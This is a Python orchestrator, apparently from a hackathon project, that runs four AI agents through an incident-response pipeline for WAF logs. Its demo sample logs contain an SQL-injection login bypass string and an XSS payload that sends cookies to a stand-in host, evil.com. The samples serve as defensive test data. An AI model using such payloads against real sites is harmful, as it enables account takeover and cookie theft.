"""
CloudGuard AI - State Manager / Orchestrator
----------------------------------------------
The central nervous system of CloudGuard AI. Runs the complete 4-stage
event-driven incident response pipeline, coordinating all agents through
the Band API state machine.

Pipeline Flow:
    Raw Log
      ↓
    [Stage 1] ThreatHunterAgent → PUSH "FORENSICS" → Band API
      ↓
    [Stage 2] PolicyCheckerAgent ← (receives forensics) → PUSH "POLICY_CHECK" → Band API
      ↓  [HALT if policy_check == FAILED]
    [Stage 3] CloudOpsRunnerAgent ← (receives policy) → PUSH "IAC_GENERATION" → Band API
      ↓
    [Stage 4] ValidatorAgent ← (receives IaC) → PUSH "VALIDATION" → Band API
      ↓
    Final Report

Run directly:
    python -m band_layer.state_manager
"""

import json
import logging
import sys
import time
from datetime import datetime, timezone
from typing import Optional

from dotenv import load_dotenv

from core_agents.threat_hunter import ThreatHunterAgent
from core_agents.policy_checker import PolicyCheckerAgent
from core_agents.cloud_ops_runner import CloudOpsRunnerAgent
from core_agents.validator import ValidatorAgent
from band_layer.band_client import BandClient, BandAPIError

load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("CloudGuardOrchestrator")

# ANSI color codes for terminal output
_RED = "\033[91m"
_GREEN = "\033[92m"
_YELLOW = "\033[93m"
_CYAN = "\033[96m"
_BOLD = "\033[1m"
_RESET = "\033[0m"


def _banner(text: str, color: str = _CYAN) -> None:
    """Prints a formatted section banner to stdout."""
    width = 70
    border = "═" * width
    print(f"\n{color}{_BOLD}╔{border}╗")
    print(f"║  {text:<{width - 2}}║")
    print(f"╚{border}╝{_RESET}")


def _step(icon: str, text: str, color: str = _CYAN) -> None:
    """Prints a formatted step indicator."""
    print(f"{color}{_BOLD}{icon}{_RESET} {text}")


class PipelineResult:
    """
    Container for the complete CloudGuard pipeline execution result.
    Captures outputs from each stage and the final status.
    """

    def __init__(self, raw_log: str):
        self.raw_log = raw_log
        self.started_at = datetime.now(timezone.utc).isoformat()
        self.completed_at: Optional[str] = None
        self.pipeline_status: str = "PENDING"  # PENDING | COMPLETED | HALTED | FAILED

        # Stage outputs
        self.forensics: Optional[dict] = None
        self.policy: Optional[dict] = None
        self.iac: Optional[dict] = None
        self.validation: Optional[dict] = None

        # Error tracking
        self.error: Optional[str] = None
        self.halt_reason: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "pipeline_status": self.pipeline_status,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "raw_log_preview": self.raw_log[:100] + "..." if len(self.raw_log) > 100 else self.raw_log,
            "stages": {
                "1_forensics": self.forensics,
                "2_policy_check": self.policy,
                "3_iac_generation": self.iac,
                "4_validation": self.validation,
            },
            "halt_reason": self.halt_reason,
            "error": self.error,
        }

    def __repr__(self) -> str:
        return json.dumps(self.to_dict(), indent=2)


class CloudGuardOrchestrator:
    """
    Event-driven orchestrator for the CloudGuard AI incident response pipeline.

    Coordinates 4 specialized CrewAI agents through the Band API state machine.
    Each agent's output is immediately pushed to the Band API before the next
    agent is invoked, ensuring a complete, real-time audit trail.

    Agents communicate ONLY through this orchestrator — they never call each
    other directly, maintaining strict separation of concerns.
    """

    def __init__(self):
        _banner("CloudGuard AI — Initializing Orchestrator", _CYAN)

        _step("🤖", "Loading AI Agents...")
        self.threat_hunter = ThreatHunterAgent()
        _step("  ✓", "ThreatHunterAgent ready", _GREEN)

        self.policy_checker = PolicyCheckerAgent()
        _step("  ✓", "PolicyCheckerAgent ready", _GREEN)

        self.cloud_ops_runner = CloudOpsRunnerAgent()
        _step("  ✓", "CloudOpsRunnerAgent ready", _GREEN)

        self.validator = ValidatorAgent()
        _step("  ✓", "ValidatorAgent ready", _GREEN)

        _step("🌐", "Connecting to Band API Hub...")
        try:
            self.band_client = BandClient()
            _step("  ✓", "Band API connection established", _GREEN)
        except (BandAPIError, EnvironmentError) as exc:
            _step("  ⚠", f"Band API unavailable: {exc}", _YELLOW)
            _step("  ⚠", "Running in offline mode — pipeline will execute without live Band sync.", _YELLOW)
            self.band_client = None

        print(f"\n{_GREEN}{_BOLD}[+] CloudGuard Orchestrator is READY.{_RESET}")

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _push_to_band(self, state: str, payload: dict) -> None:
        """
        Pushes a payload to the Band API. Handles the case where Band is offline.

        Args:
            state: Pipeline state name (e.g., "FORENSICS").
            payload: The agent's structured output dict.
        """
        if self.band_client:
            self.band_client.push(state=state, payload=payload)
        else:
            logger.warning("[Offline] Band push skipped for state=%s", state)
            print(
                f"  {_YELLOW}[Offline Mode]{_RESET} "
                f"Band push skipped for state={state}. "
                f"Payload:\n  {json.dumps(payload)[:200]}"
            )

    @staticmethod
    def _safe_parse_json(raw_output) -> dict:
        """
        Safely converts CrewAI output to a Python dict.
        Handles str, dict, and objects with .raw attribute.

        Args:
            raw_output: Output from a CrewAI agent run — dict, str, or CrewOutput.

        Returns:
            Parsed dict, or a fallback dict wrapping the raw string.
        """
        import re

        if isinstance(raw_output, dict):
            return raw_output

        raw_text = raw_output.raw if hasattr(raw_output, "raw") else str(raw_output)

        # Strip markdown fences
        cleaned = re.sub(r"```(?:json)?", "", raw_text).strip()

        # Extract first JSON object
        match = re.search(r"\{.*\}", cleaned, re.DOTALL)
        if match:
            try:
                return json.loads(match.group(0))
            except json.JSONDecodeError as exc:
                logger.warning("JSON parse failed: %s. Raw: %s", exc, raw_text[:300])

        logger.error("Could not extract JSON from output: %s", raw_text[:300])
        return {"raw_output": raw_text, "_parse_error": True}

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def run_incident_response(self, raw_log_payload: str) -> PipelineResult:
        """
        Executes the complete CloudGuard incident response pipeline.

        The pipeline is fully sequential:
        1. ThreatHunter parses the raw log → PUSH to Band
        2. PolicyChecker evaluates forensics → PUSH to Band
        3. [CONDITIONAL] If policy PASSED → CloudOpsRunner generates Terraform → PUSH to Band
        4. [CONDITIONAL] Validator audits IaC → PUSH to Band

        All inter-stage data flows through in-memory dicts (not re-pulled from Band)
        to maintain execution speed during the hackathon. Band is used as a
        write-ahead audit log and for real-time UI visibility.

        Args:
            raw_log_payload: Raw, unstructured security log string to investigate.

        Returns:
            PipelineResult containing all stage outputs and final status.
        """
        result = PipelineResult(raw_log_payload)
        _banner("CloudGuard AI — Incident Response Pipeline Started", _BOLD)

        # ── STAGE 1: FORENSICS ────────────────────────────────────────────────
        try:
            _banner("Stage 1 / 4 — FORENSICS: ThreatHunter", _CYAN)
            _step("🔍", "Running ThreatHunterAgent...")

            raw_forensics = self.threat_hunter.run(raw_log_payload)
            forensics = self._safe_parse_json(raw_forensics)

            if forensics.get("_parse_error"):
                raise ValueError(f"ThreatHunter output is not valid JSON: {forensics.get('raw_output', '')[:300]}")

            result.forensics = forensics
            _step("  ✓", f"Forensics complete: {json.dumps(forensics)[:150]}", _GREEN)

            self._push_to_band("FORENSICS", forensics)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 1 (FORENSICS) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 1 failed")
            _step("✗", f"FORENSICS FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── STAGE 2: POLICY CHECK ─────────────────────────────────────────────
        try:
            _banner("Stage 2 / 4 — POLICY CHECK: PolicyChecker", _CYAN)
            _step("🛡️", "Running PolicyCheckerAgent...")

            raw_policy = self.policy_checker.run(forensics)
            policy = self._safe_parse_json(raw_policy)

            if policy.get("_parse_error"):
                raise ValueError(f"PolicyChecker output is not valid JSON: {policy.get('raw_output', '')[:300]}")

            result.policy = policy
            policy_status = policy.get("policy_check", "UNKNOWN").upper()
            _step("  ✓", f"Policy decision: {policy_status} — {policy.get('recommended_action', 'N/A')}", _GREEN)

            self._push_to_band("POLICY_CHECK", policy)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 2 (POLICY_CHECK) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 2 failed")
            _step("✗", f"POLICY CHECK FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── POLICY GATE ───────────────────────────────────────────────────────
        policy_check = (result.policy or {}).get("policy_check", "").upper()
        if policy_check != "PASSED":
            halt_msg = (
                f"Policy check returned '{policy_check}'. "
                f"Reason: {result.policy.get('policy_reasoning', 'N/A')}. "
                f"Recommended action: {result.policy.get('recommended_action', 'N/A')}."
            )
            _step("\n⛔", f"PIPELINE HALTED — {halt_msg}", _YELLOW)
            result.pipeline_status = "HALTED"
            result.halt_reason = halt_msg
            result.completed_at = datetime.now(timezone.utc).isoformat()
            self._print_final_report(result)
            return result

        _step("  ✓", "Policy PASSED — proceeding to IaC generation.", _GREEN)

        # ── STAGE 3: IAC GENERATION ───────────────────────────────────────────
        try:
            _banner("Stage 3 / 4 — IAC GENERATION: CloudOpsRunner", _CYAN)
            _step("⚙️", "Running CloudOpsRunnerAgent...")

            # Pass forensics + policy together for richer context
            combined_context = {**result.forensics, **result.policy}
            raw_iac = self.cloud_ops_runner.run(combined_context)
            iac = self._safe_parse_json(raw_iac)

            if iac.get("_parse_error"):
                raise ValueError(f"CloudOpsRunner output is not valid JSON: {iac.get('raw_output', '')[:300]}")

            result.iac = iac
            _step("  ✓", f"Terraform generated — targets: {iac.get('target_ips', 'N/A')}", _GREEN)

            self._push_to_band("IAC_GENERATION", iac)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 3 (IAC_GENERATION) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 3 failed")
            _step("✗", f"IAC GENERATION FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── STAGE 4: VALIDATION ───────────────────────────────────────────────
        try:
            _banner("Stage 4 / 4 — VALIDATION: Validator", _CYAN)
            _step("🔎", "Running ValidatorAgent...")

            raw_validation = self.validator.run(result.iac)
            validation = self._safe_parse_json(raw_validation)

            if validation.get("_parse_error"):
                raise ValueError(f"Validator output is not valid JSON: {validation.get('raw_output', '')[:300]}")

            result.validation = validation
            validation_status = validation.get("validation_status", "UNKNOWN")
            _step("  ✓", f"Validation: {validation_status} — warnings: {validation.get('security_warnings', 'None')}", _GREEN)

            self._push_to_band("VALIDATION", validation)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 4 (VALIDATION) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 4 failed")
            _step("✗", f"VALIDATION FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── FINAL STATUS ──────────────────────────────────────────────────────
        validation_status = (result.validation or {}).get("validation_status", "")
        if validation_status == "BLOCKED_UNSAFE_CODE":
            result.pipeline_status = "HALTED"
            result.halt_reason = (
                f"Validator blocked deployment: {result.validation.get('security_warnings', 'Unknown risk')}"
            )
            _step("\n⛔", f"DEPLOYMENT BLOCKED — {result.halt_reason}", _RED)
        else:
            result.pipeline_status = "COMPLETED"
            _step("\n🚀", "Pipeline completed. IaC is SAFE TO DEPLOY.", _GREEN)

        result.completed_at = datetime.now(timezone.utc).isoformat()
        self._print_final_report(result)
        return result

    @staticmethod
    def _print_final_report(result: PipelineResult) -> None:
        """Prints a structured final report to stdout."""
        status_colors = {
            "COMPLETED": _GREEN,
            "HALTED": _YELLOW,
            "FAILED": _RED,
            "PENDING": _CYAN,
        }
        color = status_colors.get(result.pipeline_status, _CYAN)
        _banner(
            f"CloudGuard AI — Pipeline {result.pipeline_status}",
            color,
        )
        print(f"\n{_BOLD}Final Pipeline Report:{_RESET}")
        print(json.dumps(result.to_dict(), indent=2))


# ── Entry Point ───────────────────────────────────────────────────────────────

def _get_sample_logs() -> list[str]:
    """Returns a set of realistic WAF log samples for demo/testing."""
    return [
        # SQLi attack from external IP
        (
            "2026-06-14T10:33:17Z WAF BLOCK action=BLOCK clientIP=198.51.100.23 "
            "uri=/api/users/login args=username=admin'+OR+'1'='1';-- httpMethod=POST "
            "ruleId=SQLi-002 ruleGroup=AWSManagedRulesSQLiRuleSet statusCode=403"
        ),
        # XSS from external IP
        (
            "2026-06-14T11:45:02Z WAF BLOCK action=BLOCK clientIP=203.0.113.77 "
            "uri=/search args=q=<script>document.location='http://evil.com/?c='+document.cookie</script> "
            "httpMethod=GET ruleId=XSS-001 ruleGroup=AWSManagedRulesCommonRuleSet statusCode=403"
        ),
        # Internal IP (should be rejected by policy)
        (
            "2026-06-14T12:00:00Z WAF ALLOW action=ALLOW clientIP=10.0.1.45 "
            "uri=/internal/health httpMethod=GET statusCode=200"
        ),
    ]


if __name__ == "__main__":
    # ── Demo mode: run a sample SQLi incident ─────────────────────────────────
    print(f"\n{_BOLD}{_CYAN}{'='*72}")
    print("  CloudGuard AI — Band of Agents Hackathon Demo")
    print(f"  lablab.ai | Event-Driven Multi-Agent Cloud Security System")
    print(f"{'='*72}{_RESET}\n")

    # Use first sample log (SQLi attack) by default
    # Override with command-line arg: python -m band_layer.state_manager "custom log"
    if len(sys.argv) > 1:
        sample_log = " ".join(sys.argv[1:])
    else:
        sample_log = _get_sample_logs()[0]

    print(f"{_YELLOW}📋 Processing Log:{_RESET}")
    print(f"   {sample_log}\n")

    orchestrator = CloudGuardOrchestrator()
    pipeline_result = orchestrator.run_incident_response(sample_log)

    # Exit with non-zero code if pipeline failed
    if pipeline_result.pipeline_status == "FAILED":
        sys.exit(1)
